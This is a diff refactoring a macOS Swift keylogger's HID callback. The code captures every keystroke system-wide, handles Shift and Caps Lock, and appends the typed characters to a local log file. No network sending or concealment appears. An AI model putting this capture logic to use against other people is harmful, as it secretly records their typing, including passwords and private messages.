@@ -17,35 +17,33 @@ class CallbackFunctions
     //    static var prev = ""
     static var command = false
     
-    static let Handle_IOHIDInputValueCallback: IOHIDValueCallback = { context, result, sender, device in // this is the good stuff
+    static let Handle_IOHIDInputValueCallback: IOHIDValueCallback = { context, result, sender, device in
         
-        let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
-        let elem: IOHIDElement = IOHIDValueGetElement(device );
+        let this = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
+        let element: IOHIDElement = IOHIDValueGetElement(device);
         //        var test: Bool
-        if (IOHIDElementGetUsagePage(elem) != 0x07)
-        {
+        if IOHIDElementGetUsagePage(element) != 0x07 || this.appName == "KeySaver" {
             return
         }
-        let scancode = IOHIDElementGetUsage(elem);
-        if (scancode < 4 || scancode > 231)
-        {
+        let code = IOHIDElementGetUsage(element);
+        if (code < 4 || code > 231) {
             return
         }
-        let pressed = IOHIDValueGetIntegerValue(device );
-//        var dateFolder = "\(calander.component(.day, from: Date()))-\(calander.component(.month, from: Date()))-\(calander.component(.year, from: Date()))"
-//        var path = Keylogger.keylogs.appendingPathComponent(dateFolder)
-//        if !FileManager.default.fileExists(atPath: path.path)
-//        {
-//            do
-//            {
-//                try FileManager.default.createDirectory(at: path , withIntermediateDirectories: false, attributes: nil)
-//            }
-//            catch
-//            {
-//                print("Can't Create Folder")
-//            }
-//        }
-        let fileName = Keylogger.keylogs.appendingPathComponent("logs").path
+        let pressed = IOHIDValueGetIntegerValue(device);
+        //        var dateFolder = "\(calander.component(.day, from: Date()))-\(calander.component(.month, from: Date()))-\(calander.component(.year, from: Date()))"
+        //        var path = Keylogger.keylogs.appendingPathComponent(dateFolder)
+        //        if !FileManager.default.fileExists(atPath: path.path)
+        //        {
+        //            do
+        //            {
+        //                try FileManager.default.createDirectory(at: path , withIntermediateDirectories: false, attributes: nil)
+        //            }
+        //            catch
+        //            {
+        //                print("Can't Create Folder")
+        //            }
+        //        }
+        let filename = Keylogger.keylogs.appendingPathComponent("logs").path
         //        if CallbackFunctions.prev == fileName
         //        {
         //            test = false
@@ -55,14 +53,12 @@ class CallbackFunctions
         //            test = true
         //            CallbackFunctions.prev = fileName
         //        }
-        if !FileManager.default.fileExists(atPath: fileName)
-        {
-            if !FileManager.default.createFile(atPath: fileName, contents: nil, attributes: nil)
-            {
+        if !FileManager.default.fileExists(atPath: filename) {
+            if !FileManager.default.createFile(atPath: filename, contents: nil, attributes: nil) {
                 print("Can't Create File")
             }
         }
-        let fh = FileHandle.init(forWritingAtPath: fileName)
+        let fh = FileHandle.init(forWritingAtPath: filename)
         fh?.seekToEndOfFile()
         //        if test
         //        {
@@ -70,46 +66,35 @@ class CallbackFunctions
         //            fh?.write(timeStamp.data(using: .utf8)!)
         //        }
         
-        Outside:if pressed == 1 // keydown
-        {
-            if scancode == 57 // Capslock
-            {
+        Outside:if pressed == 1 { // keydown
+            if code == 57 { // Capslock
                 CallbackFunctions.CAPSLOCK = !CallbackFunctions.CAPSLOCK
                 break Outside
             }
-            if scancode == 225 { // Shift
+            if code == 225 { // Shift
                 CallbackFunctions.SHIFT = true
                 break Outside
             }
-            if scancode >= 224 && scancode <= 231 || command
-            {
-//                print(scancode)
+            if code >= 224 && code <= 231 || command {
                 command = true
-//                print("command")
                 //                fh?.write( (mySelf.keyMap[scancode]![0] + "(").data(using: .utf8)!)
                 //                print((mySelf.keyMap[scancode]![0] + "(").data(using: .utf8)!)
                 break Outside
             }
-            if CallbackFunctions.CAPSLOCK || CallbackFunctions.SHIFT // Show uppercase
-            {
-                fh?.write(mySelf.keyMap[scancode]![1].data(using: .utf8)!)
-                print(mySelf.keyMap[scancode]![1].data(using: .utf8)!)
+            if CallbackFunctions.CAPSLOCK || CallbackFunctions.SHIFT { // Show uppercase
+                fh?.write(this.keyMap[code]![1].data(using: .utf8)!)
+                print(this.keyMap[code]![1].data(using: .utf8)!)
+            } else { // Show lowercase
+                fh?.write(this.keyMap[code]![0].data(using: .utf8)!)
+                print(this.keyMap[code]![0].data(using: .utf8)!)
             }
-            else // Show lowercase
-            {
-                fh?.write(mySelf.keyMap[scancode]![0].data(using: .utf8)!)
-                print(mySelf.keyMap[scancode]![0].data(using: .utf8)!)
-            }
-        }
-        else // keyup
-        {
-            if scancode == 225 {
+        } else { // keyup
+            if code == 225 { // no more shift
                 CallbackFunctions.SHIFT = false
                 break Outside
             }
-            if scancode >= 224 && scancode <= 231
-            {
-                print(scancode)
+            if code >= 224 && code <= 231 { // no more special keys
+                print(code)
                 command = false
                 print("end command")
                 //                fh?.write(")".data(using: .utf8)!)
